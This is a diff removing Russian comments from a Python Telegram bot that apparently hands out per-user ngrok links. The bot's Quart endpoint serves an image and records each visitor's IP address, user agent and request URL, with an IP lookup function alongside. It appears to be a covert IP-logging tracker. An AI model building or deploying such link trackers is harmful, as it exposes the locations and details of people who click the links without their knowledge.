@@ -10,11 +10,11 @@ from pyngrok import ngrok
 import threading
 from cfg import *
 
-# Инициализация бота и диспетчера
+
 bot = Bot(token=TOKEN)
 dp = Dispatcher(bot)
 
-# Инициализация Quart приложения
+
 app = Quart(__name__)
 
 async def get_ip_info(ip):
@@ -38,7 +38,7 @@ async def get_ip_info(ip):
 async def serve_image():
     user_id = request.args.get('user_id')
     if user_id:
-        # Получаем реальный IP через заголовки прокси
+
         ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
         user_agent = request.headers.get('User-Agent')
         request_url = str(request.url)
@@ -77,7 +77,7 @@ async def serve_image():
 async def run_quart():
     await app.run_task(host='0.0.0.0', port=5000)
 
-# Функция для загрузки данных из JSON файла
+
 def load_data():
     if not os.path.exists('data'):
         os.makedirs('data')
@@ -89,27 +89,27 @@ def load_data():
             return {}
     return {}
 
-# Функция для сохранения данных в JSON файл
+
 def save_data(data):
     with open('data/urls.json', 'w') as file:
         json.dump(data, file, indent=4)
 
-# Добавим глобальную переменную для хранения туннеля
+
 ngrok_tunnel = None
 
 async def on_startup(dp):
     global ngrok_tunnel
     try:
-        # Убиваем все процессы ngrok
+
         os.system("pkill -f ngrok")
-        await asyncio.sleep(2)  # Ждем завершения процессов
+        await asyncio.sleep(2)  
         
-        # Устанавливаем токен и создаем один туннель
+
         ngrok.set_auth_token(tokenNgrok)
         ngrok_tunnel = ngrok.connect(5000)
         print(f"🌐 Создан туннель: {ngrok_tunnel.public_url}")
         
-        # Запускаем Quart
+
         asyncio.create_task(run_quart())
         asyncio.create_task(command_handler())
         print("🚀 Бот запущен! Введите 'stop' для остановки.")
@@ -151,7 +151,7 @@ async def regenerate_link(message: types.Message):
     data = load_data()
     
     try:
-        # Используем существующий туннель
+
         public_url = f"{ngrok_tunnel.public_url}?user_id={user_id}"
         data[user_id] = {
             'url': public_url,
@@ -174,7 +174,7 @@ def stop_bot():
             ngrok.disconnect(ngrok_tunnel.public_url)
         except:
             pass
-    # Убиваем все процессы ngrok
+
     os.system("pkill -f ngrok")
     os._exit(0)
 
